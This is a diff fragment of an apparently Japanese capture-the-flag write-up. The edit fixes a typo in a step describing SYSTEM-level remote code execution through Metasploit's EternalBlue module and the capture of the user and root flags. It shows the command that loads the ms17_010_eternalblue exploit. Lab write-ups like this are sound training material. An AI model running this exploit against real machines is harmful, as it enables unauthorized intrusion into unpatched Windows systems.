@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.19 seconds
 
 
 ## STEP 2
-metasploitでeternalblueによるrce、systemm権限取得！  
+metasploitでeternalblueによるrce、system権限取得！  
 ユーザ・ルートフラグゲット！
 ```sh
 msf6 > use exploit/windows/smb/ms17_010_eternalblue 
